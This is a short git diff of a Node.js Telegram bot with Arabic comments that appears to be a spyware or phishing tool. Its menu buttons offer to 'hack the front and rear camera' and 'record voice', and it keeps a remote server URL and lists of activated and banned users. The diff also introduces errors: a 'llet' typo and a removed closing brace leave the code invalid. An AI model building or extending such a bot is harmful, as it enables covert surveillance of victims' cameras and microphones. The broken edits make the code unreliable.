@@ -34,7 +34,7 @@ const fetch = require('node-fetch');
 const usersFile = 'users.json';
 const serverUrl = 'https://tttttt-sjgd.onrender.com/'; // تأكد من تحديث هذا الرابط
 
-let allUsers = {}; // ستحتوي على جميع المستخدمين
+llet allUsers = {}; // ستحتوي على جميع المستخدمين
 let bannedUsers = {}; 
 let activatedUsers = {};
 let userAttempts = {};
@@ -568,7 +568,7 @@ async function showButtons(chatId, userId) {
 
   // إرسال رسالة الحالة إلى المستخدم
   await bot.sendMessage(chatId, statusMessage);
-}
+
    let keyboard = [
         [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
         [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
